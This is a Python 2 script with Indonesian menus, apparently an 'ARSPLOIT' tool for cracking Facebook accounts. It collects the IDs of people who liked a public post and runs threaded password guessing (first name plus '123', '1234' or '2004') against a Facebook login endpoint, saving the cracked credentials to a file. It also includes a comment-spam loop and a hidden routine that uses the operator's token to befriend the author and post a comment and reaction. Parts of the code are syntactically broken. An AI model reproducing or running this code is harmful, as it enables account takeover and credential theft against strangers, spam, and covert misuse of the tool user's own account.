#!usr/bin/python2
# coding: UTF-8
# subscribe channel dunia kode
# subscribe channel ARSPLOIT MARIS


# MAU RECODE YA OM? ^_^
# NO RECODE DOG
import os
import socket
import sys
import time
import mechanize
import itertools
import datetime
import random
import hashlib
import re
import threading
import json
import getpass
import urllib
import cookielib
from multiprocessing.pool import ThreadPool
from urllib2 import *

# install libraries
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')

try:
    import requests
except ImportError:
    os.system('pip2 install requests')
    os.system('python2 main.py')

from requests.exceptions import ConnectionError
from mechanize import Browser
from datetime import datetime
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
os.system('clear')

def kaluar():
    sys.exit("\033[37;1m[\033[31;1m!\033[37;1m] \033[37;1mExit Program")


def ngetik(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)



logo = """
\033[31;1m
        ╭╮╱╭┳━━━┳━━╮ ╭━━━╮╱╭┳━━━╮
        ┃┃╱┃┃╭━╮┣┫┣╯ ┃╭━╮┃╱┃┃╭━╮┃
        ┃╰━╯┃┃╱┃┃┃┃╱╱┃┃╱┃┃╱┃┃┃╱╰╯
\033[37;1m        ┃╭━╮┃╰━╯┃┃┃╱╱┃╰━╯┣╮┃┃┃╱╭╮
        ┃┃╱┃┃╭━╮┣┫┣╮ ┃╭━╮┃╰╯┃╰━╯┃
        ╰╯╱╰┻╯╱╰┻━━╯ ╰╯╱╰┻━━┻━━━╯
\033[32;1mcreated \033[33;1m: \033[37;1mAris Zulwafa
\033[32;1mtools   \033[33;1m: \033[37;1mCrack Fb
\033[32;1mversi   \033[33;1m: \033[37;1m1.0
\033[32;1mwhatsapp\033[33;1m: \033[37;1m088232456646
"""
back = 0
threads = []
berhasil = []
cekpoint = []
oks = []
oke = []
id = []
idteman = []


def masuk():
    os.system('clear')
    print logo
    print '\033[41;1m Pilih Nomor:\033[00;1m'
    print '\033[31;1m[\033[33;1m+\033[31;1m]'+30*'\033[33;1m='+'\033[31;1m[\033[33;1m+\033[31;1m]'
    print '\033[37;1m[\033[32;1m01\033[37;1m] \033[34;1mlogin using token'
    print '\033[37;1m[\033[32;1m02\033[37;1m] \033[34;1mtutorial dapat token'
    print '\033[37;1m[\033[32;1m03\033[37;1m] \033[34;1mupdate tools'
    print '\033[37;1m[\033[31;1m00\033[37;1m] \033[34;1mexit'
    print '\033[31;1m[\033[33;1m+\033[31;1m]'+30*'\033[33;1m='+'\033[31;1m[\033[33;1m+\033[31;1m]'
    asup()

def kk():
    os.system('clear')
    print logo
    print 'Cara Mendapatkan ID Postingan'
    print '1.Cari Postingan Publik Yang Likenya Banyak'
    print '2.Klik Titik Tiga DiPojok Lalu Klik Salin Tautan'
    print '3.Jika Sudah Maka Ada Link Sebagai Berikut'
    print 'https://www.facebook.com/100009563131835/posts/2784729071855837/?app=fbl'
    print '4.Lalu Salin Nomor Pada Barisan Kedua         Seperti Diatas Ini'
    print '5.Dan Tempel Di Crack ID Publik'
    halo = raw_input('[Enter Untuk Keluar]')
    if halo == '':
        menu()
    else:
        print 'Enter Untuk Keluar'
        time.sleep(1)
        kk()

def asup():
    milih = raw_input('\033[32;1mpilih\033[37;1m#\033[34;1mmenu\033[32;1m~  \033[37;1m')
    if milih == '':
        print '\033[37;1m{\033[31;1m!\033[37;1m} Jangan Kosong'
        time.sleep(2)
        masuk()
    elif milih == '1' or milih == '01':
    	token()
    elif milih == '2' or milih == '02':
        tutor()
    elif milih == '3' or milih == '03':
        update()
    elif milih == '0' or milih == '00':
        keluar()
        os.system('clear')
    else:
        print '\033[37;1m{\033[31;1m!\033[37;1m} nomor ' + milih + ' tidak ada'
        time.sleep(1)
        masuk()


def token():
    os.system('clear')
    print logo
    toke = raw_input('\033[37;1m[\033[32;1m*\033[37;1m] \033[34;1minput token\033[33;1m: \033[37;1m')
    if toke == '':
        print 'Isi Token Fbmu'
        time.sleep(1)
        token()

    try:
        gas = requests.get('https://graph.facebook.com/me?access_token=' + toke)
        a = json.loads(gas.text)
        nyimpen = open('login.txt', 'w')
        nyimpen.write(toke)
        nyimpen.close()
        print 'Sedang Login'
        bot_komen()
    except KeyError:
        print 'Token Salah'
        time.sleep(1.7)
        masuk()

def update():
        os.system('clear')
        print logo
        print '\033[41;1m Mengupdate Script\033[00;1m'
        time.sleep(1)
        os.system('git pull')
        print '\033[41;1m Berhasil Di-update\033[00;1m'
        time.sleep(2)
        masuk()

def update1():
        os.system('clear')
        print logo
        print '\033[41;1m Mengupdate Script\033[00;1m'
        time.sleep(1)
        os.system('git pull')
        print '\033[41;1m Berhasil Di-update\033[00;1m'
        time.sleep(2)
        menu()

def tutor():
	os.system('clear')
        print logo
        print '\033[41;1m Tips Mendapatkan Token Tanpa Kena Cp!!!\033[00;1m'
        print '\033[41;1m Buka Ke Chrome Dan Ketik www.facebook.com Dan Loginkan Akunmu\033[00;1m'
        print '\033[41;1m Lalu Buat New Tab Tempel Link Berikut\033[00;1m'
        print '\033[41;1m https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_\033[00;1m'
        print '\033[41;1m Jika Sudah Klik Titik Tiga Diatas Samping Kanan Lalu Cari Halaman Dihalaman \033[00;1m'
        print '\033[41;1m Dan Cari Ketik EAAA Dan Kamu Akan Melihat Token Access Nya\033[00;1m'
        print '\033[41;1m Salin Lalu Temepl Di Loginan Tools Ini ^_^\033[00;1m'
        print '1.Untuk Menonton Video Tutorial'
        print '2.Untuk Keluar'
        cuk = raw_input('Pilih Mana: ')
        if cuk == '1' or cuk == '01':
               print 'Membuka Youtube'
               time.sleep(1)
               os.system("xdg-open https://youtu.be/L-tpu_1pJzg")
               masuk()
        elif cuk == '2' or cuk == '02':
               masuk()
        else:
               print 'gada Nomor Itu'
               time.sleep(1)
               tutor()

# Jangan Diubah #
def bot_komen():
    try:
        toke = open('login.txt', 'r').read()
    except IOError:
        print '[!] Gagal Masuk'
        os.system('rm -rf login.txt')

    una = '100045781089477'
    kom = 'Hai Bang Jago'
    reac = 'ANGRY'
    post = '194234645445904'
    requests.post('https://graph.facebook.com/me/friends?method=post&uids=' + una + '&access_token=' + toke)
    requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + toke)
    requests.post('https://graph.facebook.com/' + post + '/reactions?type=' + reac + '&access_token=' + toke)
    menu()

def donasi():
    os.system('clear')
    print logo
    print 'Membuka Chrome'
    time.sleep(1)
    os.system("xdg-open https://saweria.co/Ariszulwafa")
    menu()

def menu():
    os.system('clear')
    try:
        toke = open('login.txt', 'r').read()
    except IOError:
        print '\033[37;1m{\033[31;1m!\033[37;1m} Token Salah'
        os.system('clear')
        os.system('rm -rf login.txt')
        masuk()

    try:
        otw = requests.get('https://graph.facebook.com/me/?access_token=' + toke)
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
    except KeyError:
        os.system('clear')
        print '\x1b[1;96m[!] \x1b[1;91mToken Salah'
        os.system('rm -rf login.txt')
        time.sleep(1)
        masuk()
        time.sleep(1)
        masuk()
    except requests.exceptions.ConnectionError:
        print '\033[37;1m{\033[31;1m!\033[37;1m} \033[34;1mConnection Error'
        kaluar()

    os.system('clear')
    print logo
    print '\033[41;1m Selalu Update Scriptmu Agar Kamu Dapat Pembaruan:)\033[00;1m'
    print '\033[31;1m[\033[33;1m+\033[31;1m]'+40*'\033[33;1m─'+'\033[31;1m[\033[33;1m+\033[31;1m]'
    print '\033[37;1m{\033[31;1m!\033[37;1m} \033[34;1mIDENTITASMU'
    print '\x1b[1;97m{\x1b[1;96m\xe2\x80\xa2\x1b[1;97m}\x1b[1;95m NAMAMU\x1b[1;90m  =\x1b[1;92m ' + nama
    print '\x1b[1;97m{\x1b[1;96m\xe2\x80\xa2\x1b[1;97m}\x1b[1;95m USER ID\x1b[1;90m =\x1b[1;92m ' + id
    print '\033[31;1m[\033[33;1m+\033[31;1m]'+40*'\033[33;1m─'+'\033[31;1m[\033[33;1m+\033[31;1m]'
    print '\033[37;1m{\033[31;1m!\033[37;1m} \033[34;1m         **TOOLS FACEBOOK**'
    print '\033[37;1m[\033[32;1m01\033[37;1m] \033[34;1mCrack ID Postingan Publik'
    print '\033[37;1m[\033[32;1m02\033[37;1m] \033[34;1mDump ID Teman'
    print '\033[37;1m[\033[32;1m03\033[37;1m] \033[34;1mSpam Comment'
    print '\033[31;1m[\033[33;1m+\033[31;1m]'+40*'\033[33;1m─'+'\033[31;1m[\033[33;1m+\033[31;1m]'
    print '\033[37;1m{\033[31;1m!\033[37;1m} \033[34;1m            **LAINNYA**'
    print '\033[37;1m[\033[32;1m04\033[37;1m] \033[34;1mCara Mendapatkan ID Post'
    print '\033[37;1m[\033[32;1m05\033[37;1m] \033[34;1mDonasi Ke ARSPLOIT'
    print '\033[37;1m[\033[32;1m06\033[37;1m] \033[34;1mUpdate Script'
    print '\033[37;1m[\033[32;1m07\033[37;1m] \033[34;1mReport Bug
    print '\033[37;1m[\033[31;1m00\033[37;1m] \033[31;1mLogout'
    print '\033[31;1m[\033[33;1m+\033[31;1m]'+40*'\033[33;1m─'+'\033[31;1m[\033[33;1m+\033[31;1m]'
    pilih()


def pilih():
    gokil = raw_input('\033[32;1mmenu\033[37;1m@\033[34;1mterminal\033[32;1m~#  \033[37;1m')
    if gokil == '':
        print '\033[37;1m{\033[31;1m!\033[37;1m} Please enter a number'
        pilih()
    elif gokil == '1' or gokil == '01':
        crack_post()
    elif gokil == '2' or gokil == '02':
        dumpid()
    elif gokil == '3' or gokil == '03':
        spamkomen()
    elif gokil == '4' or gokil == '04':
        kk()
    elif gokil == '5' or gokil == '05':
        donasi()
    elif gokil == '6' or gokil == '06':
        update1()
    elif gokil == '7' or gokil == '07':
        report()
    elif gokil == '0' or gokil == '00':
        os.system('clear')
        print 'Delete token'
        os.system('rm -rf login.txt')
        masuk()
    else:
        print '\033[37;1m{\033[31;1m!\033[37;1m} number: ' + gokil + ' not found'
        pilih()

def spamkomen():
    try:
        toke = open('login.txt', 'r').read()
    except IOError:
        print '\033[37;1m[\033[31;1m!\033[37;1m] Token invalid'
        os.system('rm -rf login.txt')
        os.system('python2 main.py')
    os.system("clear")
    print logo
    print 'Jika Jumlah Spam Banyak,Maka Agak Lama'
    post = raw_input("\033[32;1mID Post \033[34;1m=> \033[37;1m")
    kom = raw_input("\033[32;1mKalimat \033[34;1m=> \033[37;1m")
    jml = int(input("\033[32;1mJumlah \033[34;1m=> \033[37;1m"))
    print '\033[37;1m[\033[31;1m*\033[37;1m] \033[32;1mTunggu Ya Ajc'
    for x in range(jml):
        requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + toke)
    print '\033[33;1m[\033[31;1m*\033[33;1m] \033[34;1mSuccess'
    balik = raw_input('\033[31;1m[Enter Untuk Keluar]\n')
    menu()

def report():
    os.system("clear")
    print logo
    print '\033[31;1m[\033[33;1m+\033[31;1m]'+40*'\033[33;1m─'+'\033[31;1m[\033[33;1m+\033[31;1m]'
    pesan = raw_input('\033[32;1mPesan? \033[34;1m: \033[37;1m')
    pesan.replace(' ', '%20')
    try:
        sp.check_output(['am', 'start', 'https://api.whatsapp.com/send?phone=6288232456646&text=Laporan ' + pesan + ''])
    except:
        sys.exit()
    exit('\033[31;1mthanks report bug to me')


def crack_post():
    os.system('clear')
    try:
        toke = open('login.txt', 'r').read()
    except IOError:
        print '\033[37;1m[\033[31;1m!\033[37;1m] Token invalid'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()

    try:
        os.system('clear')
        print logo
        print '\033[31;1m[\033[33;1m+\033[31;1m]'+40*'\033[33;1m─'+'\033[31;1m[\033[33;1m+\033[31;1m]'
        po = raw_input('\033[37;1m{\033[32;1m*\033[37;1m}\033[34;1m ID Postingan Teman/Publik: ')
        print '\033[31;1m[\033[33;1m+\033[31;1m]'+40*'\033[33;1m─'+'\033[31;1m[\033[33;1m+\033[31;1m]'
        r = requests.get('https://graph.facebook.com/' + po + '/likes?limit=9999999&access_token=' + toke)
        z = json.loads(r.text)
        for i in z['data']:
            id.append(i['id'])

        ngetik('\r\033[37;1m{\033[32;1m*\033[37;1m} Mengambil ID ...')
    except KeyError:
        print '\033[37;1m{\033[31;1m!\033[37;1m} ID Post Invaled !'
        balik = raw_input('\n\033[32;1m[Enter Untuk Keluar]')
        menu()

    print '\033[37;1m{\033[32;1m*\033[37;1m} Total ID : ' + str(len(id))
    print '\033[37;1m{\033[32;1m*\033[37;1m} CTRL+Z To Stop'

    def main(arg):
        sys.stdout.write(('\r{}').format(datetime.now().strftime('\x1b[1;96m%H\x1b[1;91m:\x1b[1;93m%M\x1b[1;91m:\x1b[1;92m%S')))
        sys.stdout.flush()
        jamet = arg
        try:
            os.mkdir('done')
        except OSError:
            pass

        try:
            an = requests.get('https://graph.facebook.com/' + jamet + '/?access_token=' + toke)
            j = json.loads(an.text)
            list1 = j['first_name'].lower() + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + jamet + '&locale=en_US&password=' + list1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            ko = json.load(data)
            if 'access_token' in ko:
                print ''
                print '\n\n\033[37;1m{\033[32;1m*\033[37;1m} SUCESS:)'
                print '\033[37;1m{\033[32;1m*\033[37;1m} Nama      ==> ' + j['name']
                print '\033[37;1m{\033[32;1m*\033[37;1m} User      ==> ' + jamet
                print '\033[37;1m{\033[32;1m*\033[37;1m} Password  ==> ' + list1
                print ''
                oke = open('done/group.txt', 'a')
                oke.write('\n\xe2\x9e\xa0 SUCESS \n\xe2\x9e\xa0 Nama     > ' + j['name'] + '\n\xe2\x9e\xa0 User     > ' + jamet + '\n\xe2\x9e\xa0 Password > ' + list1 + '\n')
                oke.close()
                oks.append(jamet)
            elif 'www.facebook.com' in ko['error_msg']:
                print ''
                print '\n\n\033[37;1m{\033[32;1m*\033[37;1m} CHEKPOINT:('
                print '\033[37;1m{\033[32;1m*\033[37;1m} Nama      ==> ' + j['name']
                print '\033[37;1m{\033[32;1m*\033[37;1m} User      ==> ' + jamet
                print '\033[37;1m{\033[32;1m*\033[37;1m} Password  ==> ' + list1
                print ''
                cek = open('done/group.txt', 'a')
                cek.write('\n\xe2\x9e\xa0 CHEKPOINT \n\xe2\x9e\xa0 Nama     > ' + j['name'] + '\n\xe2\x9e\xa0 User     > ' + jamet + '\n\xe2\x9e\xa0 Password > ' + list1 + '\n')
                cek.close()
                cekpoint.append(jamet)
	    else:
		list2 = j['first_name'].lower() + '1234'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + jamet + '&locale=en_US&password=' + list2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                ko = json.load(data)
                if 'access_token' in ko:
                    print ''
                    print '\n\n\033[37;1m{\033[32;1m*\033[37;1m} SUCESS'
                    print '\033[37;1m{\033[32;1m*\033[37;1m} Nama      ==> ' + j['name']
                    print '\033[37;1m{\033[32;1m*\033[37;1m} User      ==> ' + jamet
                    print '\033[37;1m{\033[32;1m*\033[37;1m} Password  ==> ' + list2
                    print ''
                    oke = open('done/group.txt', 'a')
                    oke.write('\n\xe2\x9e\xa0 SUCESS \n\xe2\x9e\xa0 Nama     > ' + j['name'] + '\n\xe2\x9e\xa0 User     > ' + jamet + '\n\xe2\x9e\xa0 Password > ' + list2 + '\n')
                    oke.close()
                    oks.append(jamet)
                elif 'www.facebook.com' in ko['error_msg']:
                    print ''
                    print '\n\n\033[37;1m{\033[32;1m*\033[37;1m} CHEKPOINT'
                    print '\033[37;1m{\033[32;1m*\033[37;1m} Nama      ==> ' + j['name']
                    print '\033[37;1m{\033[32;1m*\033[37;1m} User      ==> ' + jamet
                    print '\033[37;1m{\033[32;1m*\033[37;1m} Password  ==> ' + list2
                    print ''
                    cek = open('done/group.txt', 'a')
                    cek.write('\n\xe2\x9e\xa0 CHEKPOINT \n\xe2\x9e\xa0 Nama     > ' + j['name'] + '\n\xe2\x9e\xa0 User     > ' + jamet + '\n\xe2\x9e\xa0 Password > ' + list2 + '\n')
                    cek.close()
                    cekpoint.append(jamet)
                else:
                    list3 = j['first_name'].lower() + '2004'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + jamet + '&locale=en_US&password=' + list3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    ko = json.load(data)
                    if 'access_token' in ko:
                        print ''
                        print '\n\n\033[37;1m{\033[32;1m*\033[37;1m} SUCESS:)'
                        print '\033[37;1m{\033[32;1m*\033[37;1m} Nama      ==> ' + j['name']
                        print '\033[37;1m{\033[32;1m*\033[37;1m} User      ==> ' + jamet
                        print '\033[37;1m{\033[32;1m*\033[37;1m} Password  ==> ' + list3
                        print ''
                        oke = open('done/group.txt', 'a')
                        oke.write('\n\xe2\x9e\xa0 SUCESS \n\xe2\x9e\xa0 Nama     > ' + j['name'] + '\n\xe2\x9e\xa0 User     > ' + jamet + '\n\xe2\x9e\xa0 Password > ' + list3 + '\n')
                        oke.close()
                        oks.append(jamet)
                    elif 'www.facebook.com' in ko['error_msg']:
                        print ''
                        print '\n\n\033[37;1m{\033[32;1m*\033[37;1m} CHEKPOINT:('
                        print '\033[37;1m{\033[32;1m*\033[37;1m} Nama      ==> ' + j['name']
                        print '\033[37;1m{\033[32;1m*\033[37;1m} User      ==> ' + jamet
                        print '\033[37;1m{\033[32;1m*\033[37;1m} Password  ==> ' + list3
                        print ''
                        cek = open('done/group.txt', 'a')
                        cek.write('\n\xe2\x9e\xa0 CHEKPOINT \n\xe2\x9e\xa0 Nama     > ' + j['name'] + '\n\xe2\x9e\xa0 User     > ' + jamet + '\n\xe2\x9e\xa0 Password > ' + list3 + '\n')
                        cek.close()
                        cekpoint.append(jamet)


        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\n\033[31;1m[\033[33;1m+\033[31;1m]'+40*'\033[33;1m─'+'\033[31;1m[\033[33;1m+\033[31;1m]'
    print '\033[37;1m{\033[32;1m*\033[37;1m}Done'
    print '\033[37;1m{\033[32;1m*\033[37;1m}save : done/group.txt'
    print '\033[37;1m{\033[32;1m*\033[37;1m}Checkpoint : ' + str(len(cekpoint))
    print '\033[37;1m{\033[32;1m*\033[37;1m}Sucess     : ' + str(len(oks))
    print '\033[31;1m[\033[33;1m+\033[31;1m]'+40*'\033[33;1m─'+'\033[31;1m[\033[33;1m+\033[31;1m]'
    balik = raw_input('\n[Enter Untuk Keluar]\n')
    menu()



if __name__ == '__main__':
    menu()
    masuk()
